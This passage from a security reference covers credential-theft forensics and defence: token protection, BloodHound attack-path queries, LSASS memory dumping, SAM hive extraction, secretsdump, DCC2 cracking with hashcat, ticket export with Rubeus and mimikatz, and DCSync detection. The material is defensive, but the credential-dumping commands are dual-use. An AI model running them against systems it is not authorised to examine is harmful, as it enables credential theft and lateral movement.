# Conditional Access → Named Locations → Define trusted IPs
# Conditional Access → Policy → Session → "Customize continuous access evaluation"
#   → "Strictly enforce location policies"
# Result: if user's IP changes to untrusted, token is revoked immediately
```

**Token protection (token binding, preview):**

```
# Conditional Access → Policy → Session → "Require token protection for sign-in sessions"
# Binds the token to the device's TPM-backed key
# Stolen tokens are unusable on other devices
# Preview limitation: Windows 10/11 with Entra join only, desktop apps only
```

### 19.7 Monitoring Credential Hygiene — Attack Path Analysis

**BloodHound attack path analysis:**

```powershell
# Collect AD data with SharpHound
SharpHound.exe --CollectionMethods All --Domain domain.local --OutputDirectory C:\BH
# Or with AzureHound for cloud attack paths
azurehound.exe list --tenant "tenant-id" -o azure_data.json

# Key attack path queries (BloodHound CE Cypher):
# 1. Shortest path to Domain Admin
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
WHERE u.enabled = true AND NOT u.name STARTS WITH "KRBTGT"
RETURN p

# 2. Accounts with DCSync rights (outside Domain Admins)
MATCH p=(u)-[:GetChanges|GetChangesAll*1..2]->(d:Domain)
WHERE NOT u.name STARTS WITH "DOMAIN CONTROLLERS"
RETURN u.name, labels(u)

# 3. Kerberoastable users with path to high-value targets
MATCH (u:User {hasspn:true, enabled:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {highvalue:true}))
RETURN u.name, u.serviceprincipalnames, LENGTH(p)
ORDER BY LENGTH(p)
```

**PingCastle security scoring:**

```powershell
# Run PingCastle health check
PingCastle.exe --healthcheck --server domain.local

# Key metrics relevant to credential theft:
# - Stale privileged accounts (password age > 180 days)
# - Kerberoastable accounts with admin privileges
# - Unconstrained delegation configurations
# - Missing krbtgt rotation (> 180 days)
# - Accounts with SPN set that are members of privileged groups
# - Pre-Windows 2000 compatible access group membership
# - LAPS deployment coverage percentage

# Automated scoring with remediation priorities
PingCastle.exe --healthcheck --server domain.local --level Full
# Score interpretation: 0-20 (excellent), 21-50 (good), 51-75 (concerning), 76+ (critical)
```

---

## 20. Credential Forensics and Evidence Collection

When investigating credential theft incidents, forensically sound evidence collection is essential for understanding the scope of compromise, identifying affected accounts, and supporting legal proceedings. This section covers acquisition techniques, analysis procedures, and forensic artifacts specific to credential theft.

### 20.1 LSASS Memory Acquisition for Forensic Analysis

Forensic LSASS acquisition must balance evidence integrity with operational impact. Live acquisition captures current credential state; offline acquisition via memory image preserves the full system context.

**Live acquisition methods (ranked by forensic soundness):**

```powershell
# Method 1: comsvcs.dll MiniDump (built-in, no external tools)
# Requires: SYSTEM or SeDebugPrivilege
# Forensic note: creates standard minidump, parseable by pypykatz/Mimikatz
$lsassPID = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID C:\Evidence\lsass_$(Get-Date -Format yyyyMMdd_HHmmss).dmp full
# Immediately hash the dump
Get-FileHash C:\Evidence\lsass_*.dmp -Algorithm SHA256 | Export-Csv C:\Evidence\hashes.csv

# Method 2: ProcDump (Sysinternals — Microsoft-signed)
procdump.exe -accepteula -ma lsass.exe C:\Evidence\lsass.dmp
# Advantages: Microsoft-signed binary, widely accepted in forensic practice
# Disadvantages: triggers AV/EDR alerts on most modern endpoints

# Method 3: MagnetRAMCapture (full physical memory)
# Captures entire system RAM — includes LSASS + all other process memory
# Most forensically sound: preserves complete memory state
MagnetRAMCapture.exe /output=C:\Evidence\memory.raw
# Parse LSASS from full memory image:
volatility3 -f memory.raw windows.lsadump
volatility3 -f memory.raw windows.hashdump
volatility3 -f memory.raw windows.cachedump

# Method 4: WinPmem (open-source physical memory acquisition)
winpmem_mini_x64.exe C:\Evidence\memory.raw
```

**Tradeoffs:**

| Method | Impact on System | Evidence Completeness | AV/EDR Detection Risk | Court Admissibility |
|--------|------------------|-----------------------|-----------------------|--------------------|
| comsvcs.dll | Minimal | LSASS only | Medium (process access to LSASS) | High (built-in tool) |
| ProcDump | Minimal | LSASS only | High (well-known tool) | High (Microsoft-signed) |
| MagnetRAMCapture | Low-moderate | Full system memory | Low (legitimate forensic tool) | Highest |
| WinPmem | Low-moderate | Full system memory | Low | High |
| Live Mimikatz | Minimal | Parsed credentials only | Very high | Low (attacker tool) |

**Forensic analysis of LSASS dumps:**

```bash
# pypykatz — Python-based offline LSASS parser (runs on Linux)
pypykatz lsa minidump lsass.dmp
pypykatz lsa minidump lsass.dmp -o analysis_report.txt

# Output includes:
# - NT hashes for all cached users
# - Kerberos TGTs and service tickets with encryption keys
# - WDigest plaintext passwords (if enabled)
# - DPAPI master key material
# - TsPkg/CredSSP credentials
# - SSP list (detect injected SSPs)

# Volatility 3 — from full memory image
volatility3 -f memory.raw windows.info
volatility3 -f memory.raw windows.lsadump  # NT hashes
volatility3 -f memory.raw windows.hashdump  # SAM hashes
volatility3 -f memory.raw windows.cachedump  # DCC2 cached creds
volatility3 -f memory.raw windows.pslist | grep lsass  # Verify LSASS PID and loaded modules
```

### 20.2 SAM/SYSTEM/SECURITY Hive Extraction and Offline Analysis

Registry hives contain local account hashes (SAM), encryption keys (SYSTEM), and cached domain credentials (SECURITY). Forensic extraction allows offline analysis without touching the live system.

```powershell
# Method 1: reg save (requires SYSTEM or admin)
reg save HKLM\SAM C:\Evidence\SAM
reg save HKLM\SYSTEM C:\Evidence\SYSTEM
reg save HKLM\SECURITY C:\Evidence\SECURITY
# Hash all extracted hives
Get-FileHash C:\Evidence\SAM, C:\Evidence\SYSTEM, C:\Evidence\SECURITY -Algorithm SHA256

# Method 2: Volume Shadow Copy (access locked hives)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Evidence\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Evidence\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Evidence\SECURITY

# Method 3: FTK Imager (forensic tool — mounts as read-only)
# Mount the evidence drive read-only and navigate to:
# \Windows\System32\config\SAM
# \Windows\System32\config\SYSTEM
# \Windows\System32\config\SECURITY
```

**Offline analysis:**

```bash
# Impacket secretsdump — extract all credential material
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Output includes:
# - Local account NT hashes (SAM)
# - LSA secrets (SECURITY) — service account passwords, DPAPI keys
# - Cached domain credentials (DCC2) — last N domain logons
# - Machine account password

# Crack DCC2 cached credentials (hashcat mode 2100)
# Format: $DCC2$10240#username#hash
hashcat -m 2100 dcc2_hashes.txt wordlist.txt -r rules/best64.rule
# DCC2 uses PBKDF2 with 10,240 iterations — significantly slower to crack than NT hashes

# Chntpw — registry hive browser (for manual inspection)
chntpw -l SAM    # List local accounts
chntpw -e SAM    # Interactive registry editor
```

### 20.3 Kerberos Ticket Cache Forensics

Kerberos ticket caches contain TGTs and service tickets that can reveal lateral movement patterns, Golden/Silver Ticket usage, and compromised service accounts.

```powershell
# Live system — list cached tickets
klist              # Current user's tickets
klist -li 0x3e7    # SYSTEM tickets (requires SYSTEM)

# Rubeus — dump all tickets (requires elevation)
Rubeus.exe dump /nowrap
Rubeus.exe dump /service:krbtgt  # TGTs only
Rubeus.exe dump /luid:0x12345   # Specific logon session

# Export tickets to .kirbi files for analysis
Rubeus.exe dump /outfile:C:\Evidence\tickets\
mimikatz # kerberos::list /export
# Each ticket saved as [session]-[service]-[domain].kirbi
```

**Ticket analysis for forensic indicators:**

```bash
# Parse .kirbi files
python3 describeTicket.py ticket.kirbi

# Key forensic indicators in Kerberos tickets:
# 1. Anomalous TGT lifetime: Golden Tickets often have 10-year lifetimes
#    (default domain policy is 10 hours)
# 2. Encryption type mismatch: RC4 (0x17) TGT for account that has AES keys
#    indicates forged or downgraded ticket
# 3. SID history in PAC: SIDs not matching the user's actual group membership
#    indicates Golden Ticket with injected SIDs
# 4. Renew-till mismatch: Golden Tickets set renew-till to 10 years
#    (default is 7 days)
# 5. TGT without corresponding AS-REQ: ticket exists on system but DC
#    has no Event ID 4768 for that session — indicates injected ticket

# Impacket — parse tickets from ccache format
python3 -c "
from impacket.krb5.ccache import CCache
cc = CCache.loadFile('krb5cc_file')
for cred in cc.credentials:
    print(f'Service: {cred.header[\"server\"].prettyPrint()}')
    print(f'Expires: {cred.header[\"time\"][\"endtime\"]}')
    print(f'Encryption: {cred.header[\"key\"][\"keytype\"]}')
"

# Linux — examine ticket cache
klist -c /tmp/krb5cc_1000        # User ticket cache
klist -ke /etc/krb5.keytab       # Service keytab
```

### 20.4 Active Directory Replication Metadata Analysis

Detecting DCSync artifacts requires analyzing AD replication metadata to identify unauthorized replication events.

```powershell
# Check replication metadata for sensitive attributes
# The "msDS-ReplAttributeMetaData" attribute on user objects records
# which DC last replicated each attribute and when

# Check krbtgt replication history (DCSync target #1)
$krbtgt = Get-ADUser krbtgt -Properties "msDS-ReplAttributeMetaData"
$krbtgt."msDS-ReplAttributeMetaData" | ForEach-Object {
    ([xml]"<r>$_</r>").r.DS_REPL_ATTR_META_DATA |
    Where-Object { $_.pszAttributeName -in @("unicodePwd","ntPwdHistory","supplementalCredentials") } |
    Select-Object pszAttributeName, pszLastOriginatingDsaDN, ftimeLastOriginatingChange
}
# If the "pszLastOriginatingDsaDN" points to a non-DC, DCSync occurred

# Check which accounts have replication rights
$domainDN = (Get-ADDomain).DistinguishedName
(Get-Acl "AD:\$domainDN").Access |
  Where-Object {
    $_.ObjectType -in @(
      "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",  # DS-Replication-Get-Changes
      "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",  # DS-Replication-Get-Changes-All
      "89e95b76-444d-4c62-991a-0facbeda640c"   # DS-Replication-Get-Changes-In-Filtered-Set
    )
  } | Select-Object IdentityReference, ObjectType, AccessControlType

# Monitor Event ID 4662 for replication access
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4662} |
  Where-Object {
    $_.Properties[8].Value -match "1131f6ad" -and
    $_.Properties[1].Value -notmatch '\$$'  # Exclude machine accounts (DCs)
  } | Select-Object TimeCreated,
    @{n='User';e={$_.Properties[1].Value}},
    @{n='Operation';e={$_.Properties[8].Value}}
```

### 20.5 Token Forensics

Identifying token manipulation requires correlation of Event Logs and ETW traces to detect impersonation, token theft, and privilege escalation via token abuse.

```powershell
# Event Logs for token manipulation
# Event ID 4624 LogonType 9 (NewCredentials) — make_token / runas /netonly
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
  Where-Object { $_.Properties[8].Value -eq 9 } |
  Select-Object TimeCreated,
    @{n='User';e={$_.Properties[5].Value}},
    @{n='LogonType';e={$_.Properties[8].Value}},
    @{n='Process';e={$_.Properties[17].Value}}

# Event ID 4648 (Explicit credential logon) — runas, PsExec, token manipulation
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4648} |
  Select-Object TimeCreated,
    @{n='SubjectUser';e={$_.Properties[1].Value}},
    @{n='TargetUser';e={$_.Properties[5].Value}},
    @{n='TargetServer';e={$_.Properties[8].Value}},
    @{n='Process';e={$_.Properties[11].Value}}

# Event ID 4672 (Special privileges assigned) — token with admin SIDs
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4672} |
  Where-Object { $_.Properties[1].Value -notmatch 'SYSTEM|LOCAL SERVICE|NETWORK SERVICE' } |
  Select-Object TimeCreated, @{n='User';e={$_.Properties[1].Value}},
    @{n='Privileges';e={$_.Properties[4].Value}}

# ETW — Microsoft-Windows-Security-Auditing for token operations
# Enable token integrity auditing via GPO:
# Computer Configuration → Policies → Windows Settings → Security Settings →
#   Advanced Audit Policy Configuration → Detailed Tracking
#   "Audit Token Right Adjusted" = Success, Failure
# Generates Event ID 4703 (token right adjusted)
```

**Token forensic indicators:**

| Indicator | Event Source | Interpretation |
|-----------|-------------|----------------|
| LogonType 9 without preceding user interaction | Event ID 4624 | `make_token` or `runas /netonly` — common in C2 frameworks |
| Event ID 4648 from unexpected process | Security Log | Explicit credential use — potential token theft |
| SeDebugPrivilege assignment to non-admin | Event ID 4672 | Privilege escalation preparation (needed for LSASS access) |
| Token with SID history not matching user | Event ID 4627 | Golden Ticket or SID history injection |
| Process running as SYSTEM from user session | Sysmon Event ID 1 | Potato-style privilege escalation (token impersonation) |

### 20.6 Cloud Credential Forensics

Cloud credential theft investigation requires analyzing identity provider logs, OAuth consent grants, and service principal credential timelines across Entra ID, AWS, and GCP.

**Entra ID (Azure AD) sign-in log analysis:**

```powershell
# Microsoft Graph — export sign-in logs for analysis
# Requires: Security Reader or Global Reader role

# Suspicious sign-in patterns
# 1. Impossible travel (same user, different geolocations, short interval)
Connect-MgGraph -Scopes "AuditLog.Read.All"
$signIns = Get-MgAuditLogSignIn -Filter "userId eq '{USER_OBJECT_ID}'" `
  -Top 500 -OrderBy "createdDateTime desc"

$signIns | Select-Object CreatedDateTime, UserPrincipalName,
  @{n='IP';e={$_.IpAddress}},
  @{n='Location';e={"$($_.Location.City), $($_.Location.CountryOrRegion)"}},
  @{n='App';e={$_.AppDisplayName}},
  @{n='Status';e={$_.Status.ErrorCode}},
  @{n='RiskLevel';e={$_.RiskLevelDuringSignIn}},
  @{n='CAE';e={$_.AuthenticationProcessingDetails | Where-Object Key -eq "IsCAEToken"}}

# 2. OAuth consent grant audit (detect illicit consent grants)
Get-MgOAuth2PermissionGrant -All | Where-Object {
  $_.ConsentType -eq "AllPrincipals" -and
  $_.Scope -match "Mail.Read|Files.ReadWrite|full_access"
} | Select-Object ClientId, ResourceId, Scope, ConsentType

# 3. Service principal credential timeline
Get-MgServicePrincipal -All | ForEach-Object {
  $sp = $_
  $sp.KeyCredentials + $sp.PasswordCredentials | ForEach-Object {
    [PSCustomObject]@{
      SPName = $sp.DisplayName
      SPId = $sp.AppId
      CredType = $_.GetType().Name
      StartDate = $_.StartDateTime
      EndDate = $_.EndDateTime
      KeyId = $_.KeyId
    }
  }
} | Where-Object { $_.StartDate -gt (Get-Date).AddDays(-90) } |
  Sort-Object StartDate -Descending

# 4. Detect token replay from unusual locations
# Unified Audit Log (Exchange Online)
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations "UserLoggedIn" -ResultSize 5000 |
  Where-Object { $_.AuditData | ConvertFrom-Json | Where-Object { $_.ClientIP -notmatch $trustedIPRegex } }
```

**AWS credential forensics:**

```bash
# CloudTrail — analyze IAM credential usage
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin \
  --start-time "2025-01-01T00:00:00Z" \
  --end-time "2025-03-15T00:00:00Z" \
  --query 'Events[?contains(CloudTrailEvent, `Failed`)]'

# Detect programmatic access key abuse
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIAIOSFODNN7EXAMPLE \
  --query 'Events[].{Time:EventTime,Event:EventName,Source:EventSource,IP:CloudTrailEvent}' \
  --output table

# Check for unauthorized key creation
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey \
  --start-time "2025-01-01T00:00:00Z"

# IAM credential report — identify stale access keys
aws iam generate-credential-report
aws iam get-credential-report --query Content --output text | base64 -d > cred_report.csv
# Flag: access_key_last_used > 90 days, password_last_changed > 90 days, mfa_active = false

# STS token forensics — detect assumed role abuse
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --query 'Events[].{Time:EventTime,Role:Resources[0].ResourceName,Source:CloudTrailEvent}'
```

**GCP credential forensics:**

```bash
# Cloud Audit Logs — service account key usage
gcloud logging read '
  resource.type="service_account"
  AND (protoPayload.methodName="google.iam.admin.v1.CreateServiceAccountKey"
       OR protoPayload.methodName="google.iam.admin.v1.UploadServiceAccountKey")
' --project=PROJECT_ID --freshness=90d --format=json

# Detect anomalous authentication patterns
gcloud logging read '
  logName="projects/PROJECT_ID/logs/cloudaudit.googleapis.com%2Factivity"
  AND protoPayload.authenticationInfo.principalEmail="compromised@project.iam.gserviceaccount.com"
' --freshness=30d --format=json | jq '.[] | {timestamp, method: .protoPayload.methodName, ip: .protoPayload.requestMetadata.callerIp}'

# List all service account keys (identify unauthorized keys)
gcloud iam service-accounts keys list \
  --iam-account=SA_EMAIL --project=PROJECT_ID \
  --format="table(name, validAfterTime, validBeforeTime, keyAlgorithm, keyOrigin)"
```

---

## Cross-References

- **Domain 2 Chapter 2C** — Capabilities, namespaces, and LSMs — OS primitives underlying credential protection; Credential Guard and VBS architecture
- **Domain 11 Chapter 11A** — Process injection techniques used by credential dumping tools
- **Domain 11 Chapter 11B** — EDR evasion (syscall abuse, ETW patching, AMSI bypass) used by modern dump tools
- **Domain 13 Chapter 13B** — Kerberos and NTLM protocol internals — cryptographic foundations of Kerberoasting, AS-REP Roasting, NTLM relay
- **Domain 14 Chapter 14A** — Active Directory attack paths — DCSync, delegation abuse, ADCS exploitation; tiered administration and attack path analysis
- **Domain 14 Chapter 14B** — Windows internals — token architecture, LSASS architecture, credential storage
- **Domain 29 Chapter 29A** — Ransomware operations — credential theft enabling lateral movement and domain-wide encryption; Kaseya/REvil MSP compromise chain
- **Domain 29 Chapter 29B** — SolarWinds campaign — Golden SAML usage in SUNBURST/UNC2452; AD FS compromise methodology
- **Domain 30 Chapter 30A** — C2 framework internals — platforms through which credential theft is executed
- **Domain 31 Chapter 31A** — SIEM/SOAR pipeline design — operationalizing credential theft detection at scale; Sigma rule deployment and correlation engine configuration
